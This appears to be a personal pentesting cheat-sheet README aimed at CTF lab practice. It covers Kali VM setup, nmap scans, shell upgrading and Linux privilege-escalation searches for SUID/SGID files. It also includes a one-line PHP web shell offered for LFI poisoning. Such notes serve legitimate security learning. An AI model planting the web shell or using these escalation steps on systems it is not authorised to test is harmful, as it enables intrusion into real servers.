# usefulpentestinfo
Collection of scripts, tools, and other useful stuff I've found for pentesting.

## Virtual Machine Setup
I use https://www.virtualbox.org/ with a Kali Linux image from https://www.kali.org/get-kali/#kali-virtual-machines .

If you're using a VPN on your host machine, make sure to enable NAT, and use the "Paravirtualized network adapter (virtio-net)". 

Otherwise even if you're using a VPN on your host, the VPN will basically skip the VPN connection and access the internet directly.

## Miscellaneous Useful Stuff
`IP="xxx.xxx.xxx.xxx"` <- Target IP Here - A easy way to save yourself tons of typing the same IP addr over and over again.

Then whenever you run a command, you can just use `$IP` to use that saved IP Addr.

EXAMPLE: `nmap -A -T4 $IP`

## Upgrading Shells
`python -c 'import pty; pty.spawn("/bin/bash")'`
## Update Scripts
`apt-get update && apt-get upgrade && yum update`

## LFI Poisoning 

If the system is hosting a web-server, you can try 
`<?php system($_GET['c']); ?>`
## NMAP Scans
`nmap -T4 -p- $IP` - The first scan I usually run, quickly scans for every port on a box. A lot of TryHackMe and HackTheBox rooms will have some random service hosted on a high port.

`nmap -A -T4 -p {PORT1,PORT2,PORT3} $IP` - I then run a scan with -A (enables OS detection (-O), version scanning (-sV), script scanning
    (-sC) and traceroute (--traceroute)) and I do specific port scanning for the port numbers found in the first scan.

## SMB Enum

## Password Cracking

## Privilege Escalation - Linux
`sudo -l` - Lists files that the current user can run as root without password.

`find / -perm -g=s -o -perm -u=s -type f 2>/dev/null` - Seach for files with a SGID or SUID bit set

``for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done`` - Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other \*bin, for SGID or SUID (Quicker search)

If any of the above scripts find something, search the command/file on https://gtfobins.github.io/, you can usually go into a root shell, or read files that you don't have access to with this.
